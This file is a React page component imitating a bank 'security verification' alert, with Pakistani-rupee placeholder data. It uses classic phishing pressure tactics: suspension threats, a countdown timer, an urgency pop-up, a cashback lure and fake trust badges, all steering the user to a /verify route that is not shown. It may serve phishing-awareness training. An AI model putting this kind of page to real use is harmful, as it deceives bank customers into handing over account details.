import { useNavigate } from "react-router-dom";
import { useEffect, useState } from "react";
import { Shield, Lock, AlertTriangle, Clock, Phone, Mail, CheckCircle, ArrowRight, X, Info } from "lucide-react";
import Footer from "../components/Footer";

const BankVerification = () => {
  const navigate = useNavigate();

  const [showForm, setShowForm] = useState(false);
  const [timeLeft, setTimeLeft] = useState(3 * 60);
  const [showAd, setShowAd] = useState(true);
  const [showPopup, setShowPopup] = useState(false);

  useEffect(() => {
    if (!showForm) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev <= 1 ? (clearInterval(timer), 0) : prev - 1));
    }, 1000);
    
    // Show popup after 5 seconds
    const popupTimer = setTimeout(() => setShowPopup(true), 5000);
    
    return () => {
      clearInterval(timer);
      clearTimeout(popupTimer);
    };
  }, [showForm]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  // Initial alert with enhanced design
  if (!showForm) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-50 via-white to-blue-50 px-4 py-8">
        <div className="w-full max-w-3xl">
          {/* Warning Badge */}
          <div className="flex justify-center mb-6">
            <div className="inline-flex items-center gap-2 bg-red-100 border border-red-300 rounded-full px-6 py-2">
              <AlertTriangle className="w-5 h-5 text-red-600" />
              <span className="text-sm font-semibold text-red-700">Security Alert Detected</span>
            </div>
          </div>

          {/* Main Alert Card */}
          <div className="bg-white border-2 border-red-200 rounded-2xl shadow-2xl overflow-hidden">
            {/* Header with urgent banner */}
            <div className="bg-gradient-to-r from-red-600 to-orange-600 text-white py-3 px-6 flex items-center justify-center gap-2">
              <Lock className="w-5 h-5 animate-pulse" />
              <span className="font-bold text-lg">URGENT: Account Security Notice</span>
            </div>

            <div className="p-8 sm:p-12">
              {/* Bank Logo */}
              <div className="flex justify-center mb-6">
                <div className="bg-gradient-to-br from-green-600 to-green-700 p-4 rounded-xl shadow-lg">
                  <Shield className="w-12 h-12 text-white" />
                </div>
              </div>

              <h2 className="text-green-700 font-bold text-2xl sm:text-3xl mb-4 text-center">
                Critical Security Verification Required
              </h2>

              {/* Alert Box */}
              <div className="bg-red-50 border-l-4 border-red-600 rounded-lg p-6 mb-6">
                <div className="flex items-start gap-3">
                  <AlertTriangle className="w-6 h-6 text-red-600 flex-shrink-0 mt-1" />
                  <div>
                    <p className="font-semibold text-red-800 mb-2">Suspicious Activity Detected!</p>
                    <p className="text-red-700 text-sm">
                      Our security system has identified unusual login attempts from an unrecognized device in a different location.
                    </p>
                  </div>
                </div>
              </div>

              {/* Account Info */}
              <div className="bg-gray-50 rounded-xl p-6 mb-6 space-y-3">
                <div className="flex justify-between items-center">
                  <span className="text-gray-600 text-sm">Customer ID:</span>
                  <span className="font-bold text-gray-800">0000-1234-5678-90</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-600 text-sm">Account Status:</span>
                  <span className="inline-flex items-center gap-1 bg-yellow-100 text-yellow-800 px-3 py-1 rounded-full text-xs font-semibold">
                    <Clock className="w-3 h-3" />
                    Pending Review
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-600 text-sm">Risk Level:</span>
                  <span className="inline-flex items-center gap-1 bg-red-100 text-red-800 px-3 py-1 rounded-full text-xs font-semibold">
                    High
                  </span>
                </div>
              </div>

              {/* Message */}
              <div className="mb-6">
                <p className="text-gray-700 leading-relaxed mb-4">
                  <strong className="text-gray-900">Dear Valued Customer,</strong>
                </p>
                <p className="text-gray-700 leading-relaxed mb-4">
                  To protect your account and prevent unauthorized access, we require immediate verification of your account details. 
                  <span className="font-semibold text-red-600"> Your account will be temporarily suspended in 24 hours</span> if verification is not completed.
                </p>
                <p className="text-gray-700 leading-relaxed">
                  Please review your account information and complete the secure verification process to restore full access.
                </p>
              </div>

              {/* CTA Button */}
              <button
                onClick={() => setShowForm(true)}
                className="w-full group bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 rounded-xl transition-all duration-300 transform hover:scale-[1.02] shadow-lg hover:shadow-xl flex items-center justify-center gap-2"
              >
                <Lock className="w-5 h-5" />
                Review Account Details Now
                <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
              </button>

              {/* Trust Indicators */}
              <div className="mt-6 flex items-center justify-center gap-6 text-xs text-gray-500">
                <div className="flex items-center gap-1">
                  <CheckCircle className="w-4 h-4 text-green-600" />
                  <span>SSL Secured</span>
                </div>
                <div className="flex items-center gap-1">
                  <Shield className="w-4 h-4 text-green-600" />
                  <span>Bank Protected</span>
                </div>
                <div className="flex items-center gap-1">
                  <Lock className="w-4 h-4 text-green-600" />
                  <span>Encrypted</span>
                </div>
              </div>
            </div>
          </div>

          {/* Help Text */}
          <p className="text-center text-gray-600 text-sm mt-6">
            If you did not attempt to access your account, please contact us immediately at <strong>+92 300 1234567</strong>
          </p>
        </div>
      </div>
    );
  }

  // Enhanced Bank Info Page
  return (
    <div className="flex flex-col min-h-screen w-full bg-gradient-to-br from-gray-50 to-blue-50">
      {/* Floating Ad */}
      {showAd && (
        <div className="fixed top-24 right-4 sm:right-10 bg-gradient-to-br from-orange-500 to-red-500 shadow-2xl border-2 border-orange-400 p-6 rounded-2xl z-50 w-80 sm:w-96 animate-bounce">
          <button
            onClick={() => setShowAd(false)}
            className="absolute top-2 right-2 bg-white/20 hover:bg-white/30 text-white rounded-full p-1 transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
          <h3 className="font-bold text-white text-xl mb-2 flex items-center gap-2">
            🎁 Limited Time Offer!
          </h3>
          <p className="text-white/90 text-sm mb-4">
            Update your account now and receive <strong className="text-yellow-300">10% cashback</strong> on your next 3 transactions! 
            Plus get <strong className="text-yellow-300">FREE</strong> premium account upgrade!
          </p>
          <button className="w-full bg-white hover:bg-gray-100 text-orange-600 py-2 px-4 rounded-lg font-bold text-sm transition-colors shadow-lg">
            Claim Offer Now! →
          </button>
        </div>
      )}

      {/* Urgency Popup */}
      {showPopup && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl p-8 max-w-md w-full shadow-2xl animate-fadeIn">
            <div className="flex justify-center mb-4">
              <div className="bg-red-100 p-4 rounded-full">
                <AlertTriangle className="w-12 h-12 text-red-600" />
              </div>
            </div>
            <h3 className="text-2xl font-bold text-center mb-4 text-gray-800">
              Time is Running Out!
            </h3>
            <p className="text-gray-600 text-center mb-6">
              Your account verification must be completed soon to avoid service interruption. Don't miss this critical security update!
            </p>
            <button
              onClick={() => setShowPopup(false)}
              className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition-colors"
            >
              I Understand, Continue
            </button>
          </div>
        </div>
      )}

      <div className="flex-grow flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-7xl bg-white shadow-2xl rounded-3xl overflow-hidden border border-gray-200">
          {/* Top Banner */}
          <div className="bg-gradient-to-r from-green-600 to-blue-600 text-white py-4 px-6 flex flex-col sm:flex-row items-center justify-between gap-4">
            <div className="flex items-center gap-3">
              <Shield className="w-6 h-6" />
              <span className="font-semibold">Secure Banking Portal</span>
            </div>
            <div className="flex items-center gap-6 text-sm">
              <div className="flex items-center gap-2">
                <Phone className="w-4 h-4" />
                <span>+92 300 1234567</span>
              </div>
              <div className="flex items-center gap-2">
                <Mail className="w-4 h-4" />
                <span>support@bank.com</span>
              </div>
            </div>
          </div>

          <div className="p-6 sm:p-12">
            {/* Header */}
            <div className="text-center mb-8">
              <div className="flex justify-center items-center gap-2 mb-4">
                <div className="bg-green-100 p-3 rounded-xl">
                  <Lock className="w-8 h-8 text-green-600" />
                </div>
              </div>
              <h1 className="text-3xl sm:text-4xl lg:text-5xl font-bold text-gray-800 mb-3">
                Account Security Review
              </h1>
              <p className="text-gray-600 text-base sm:text-lg max-w-2xl mx-auto">
                Complete the verification process below to maintain uninterrupted access to your banking services
              </p>
            </div>

            {/* Urgent Alert */}
            <div className="bg-gradient-to-r from-red-50 to-orange-50 border-l-4 border-red-500 rounded-xl p-6 mb-8 flex items-start gap-4">
              <AlertTriangle className="w-6 h-6 text-red-600 flex-shrink-0 mt-1" />
              <div className="flex-1">
                <p className="font-bold text-red-800 mb-2">⚠️ URGENT ACTION REQUIRED</p>
                <p className="text-red-700 text-sm sm:text-base">
                  Your account requires immediate verification. Failure to complete this process within <strong className="text-red-900">{formatTime(timeLeft)}</strong> may result in temporary account restrictions and transaction limitations.
                </p>
              </div>
            </div>

            {/* Two Column Layout */}
            <div className="grid lg:grid-cols-2 gap-8 mb-8">
              {/* Left Column - Account Info */}
              <div className="space-y-6">
                <div className="bg-gradient-to-br from-gray-50 to-blue-50 rounded-2xl p-6 border border-gray-200">
                  <h2 className="font-bold text-xl mb-4 flex items-center gap-2 text-gray-800">
                    <Info className="w-5 h-5 text-blue-600" />
                    Account Overview
                  </h2>
                  <div className="space-y-3">
                    <div className="flex justify-between items-center py-2 border-b border-gray-200">
                      <span className="text-gray-600 text-sm">Customer ID</span>
                      <span className="font-semibold text-gray-800">0000-1234-5678-90</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b border-gray-200">
                      <span className="text-gray-600 text-sm">Account Type</span>
                      <span className="font-semibold text-gray-800">Current / Checking</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b border-gray-200">
                      <span className="text-gray-600 text-sm">Balance</span>
                      <span className="font-semibold text-green-600">PKR 125,430.00</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b border-gray-200">
                      <span className="text-gray-600 text-sm">Email</span>
                      <span className="font-semibold text-gray-800 text-xs sm:text-sm break-all">user@example.com</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b border-gray-200">
                      <span className="text-gray-600 text-sm">Phone</span>
                      <span className="font-semibold text-gray-800">+92 300 1234567</span>
                    </div>
                    <div className="flex justify-between items-center py-2">
                      <span className="text-gray-600 text-sm">Last Login</span>
                      <span className="font-semibold text-gray-800 text-xs sm:text-sm">02-Jan-2026, 14:35</span>
                    </div>
                  </div>
                </div>

                {/* Security Tips */}
                <div className="bg-blue-50 border border-blue-200 rounded-2xl p-6">
                  <h3 className="font-bold text-lg mb-3 flex items-center gap-2 text-blue-800">
                    <Shield className="w-5 h-5" />
                    Security Tips
                  </h3>
                  <ul className="space-y-2 text-sm text-blue-900">
                    <li className="flex items-start gap-2">
                      <CheckCircle className="w-4 h-4 text-blue-600 flex-shrink-0 mt-0.5" />
                      <span>Never share your password or OTP</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <CheckCircle className="w-4 h-4 text-blue-600 flex-shrink-0 mt-0.5" />
                      <span>Always log out from shared devices</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <CheckCircle className="w-4 h-4 text-blue-600 flex-shrink-0 mt-0.5" />
                      <span>Monitor account for suspicious activity</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <CheckCircle className="w-4 h-4 text-blue-600 flex-shrink-0 mt-0.5" />
                      <span>Contact support for unauthorized transactions</span>
                    </li>
                  </ul>
                </div>
              </div>

              {/* Right Column - Transactions */}
              <div className="space-y-6">
                <div className="bg-gradient-to-br from-gray-50 to-green-50 rounded-2xl p-6 border border-gray-200">
                  <h2 className="font-bold text-xl mb-4 text-gray-800">Recent Transactions</h2>
                  <div className="space-y-3">
                    <div className="bg-white rounded-xl p-4 border border-gray-200 hover:shadow-md transition-shadow">
                      <div className="flex justify-between items-start mb-2">
                        <div>
                          <p className="font-semibold text-gray-800">Utility Payment</p>
                          <p className="text-xs text-gray-500">31-Dec-2025</p>
                        </div>
                        <span className="font-bold text-red-600">-2,500.00</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <CheckCircle className="w-3 h-3 text-green-600" />
                        <span className="text-xs text-green-600 font-semibold">Completed</span>
                      </div>
                    </div>

                    <div className="bg-white rounded-xl p-4 border border-gray-200 hover:shadow-md transition-shadow">
                      <div className="flex justify-between items-start mb-2">
                        <div>
                          <p className="font-semibold text-gray-800">Salary Credit</p>
                          <p className="text-xs text-gray-500">30-Dec-2025</p>
                        </div>
                        <span className="font-bold text-green-600">+45,000.00</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <CheckCircle className="w-3 h-3 text-green-600" />
                        <span className="text-xs text-green-600 font-semibold">Completed</span>
                      </div>
                    </div>

                    <div className="bg-white rounded-xl p-4 border border-gray-200 hover:shadow-md transition-shadow">
                      <div className="flex justify-between items-start mb-2">
                        <div>
                          <p className="font-semibold text-gray-800">Online Shopping</p>
                          <p className="text-xs text-gray-500">28-Dec-2025</p>
                        </div>
                        <span className="font-bold text-red-600">-3,200.00</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <CheckCircle className="w-3 h-3 text-green-600" />
                        <span className="text-xs text-green-600 font-semibold">Completed</span>
                      </div>
                    </div>

                    <div className="bg-white rounded-xl p-4 border border-gray-200 hover:shadow-md transition-shadow">
                      <div className="flex justify-between items-start mb-2">
                        <div>
                          <p className="font-semibold text-gray-800">ATM Withdrawal</p>
                          <p className="text-xs text-gray-500">27-Dec-2025</p>
                        </div>
                        <span className="font-bold text-red-600">-5,000.00</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <CheckCircle className="w-3 h-3 text-green-600" />
                        <span className="text-xs text-green-600 font-semibold">Completed</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Countdown Timer */}
            <div className="bg-gradient-to-r from-orange-50 to-red-50 border-2 border-orange-300 rounded-2xl p-8 text-center mb-8">
              <div className="flex justify-center mb-3">
                <Clock className="w-10 h-10 text-orange-600 animate-pulse" />
              </div>
              <p className="text-sm text-orange-800 font-semibold mb-2">TIME REMAINING TO COMPLETE VERIFICATION</p>
              <p className="text-5xl font-bold text-orange-600 mb-2">{formatTime(timeLeft)}</p>
              <p className="text-xs text-orange-700">Your session will expire after this time</p>
            </div>

            {/* CTA Button */}
            <button
              onClick={() => navigate("/verify")}
              className="w-full group bg-gradient-to-r from-blue-600 to-green-600 hover:from-blue-700 hover:to-green-700 text-white font-bold py-5 rounded-2xl transition-all duration-300 transform hover:scale-[1.02] shadow-xl hover:shadow-2xl flex items-center justify-center gap-3 text-lg mb-6"
            >
              <Lock className="w-6 h-6" />
              Proceed to Secure Verification
              <ArrowRight className="w-6 h-6 group-hover:translate-x-1 transition-transform" />
            </button>

            {/* Help Section */}
            <div className="bg-gray-50 rounded-2xl p-6 text-center border border-gray-200">
              <p className="text-gray-700 mb-3">
                <strong>Need Immediate Assistance?</strong>
              </p>
              <div className="flex flex-col sm:flex-row items-center justify-center gap-4 text-sm">
                <div className="flex items-center gap-2 text-green-600 font-semibold">
                  <Phone className="w-4 h-4" />
                  <span>Call: +92 300 1234567</span>
                </div>
                <div className="hidden sm:block text-gray-400">|</div>
                <button className="text-blue-600 hover:text-blue-700 underline font-semibold">
                  Visit Help Center
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default BankVerification;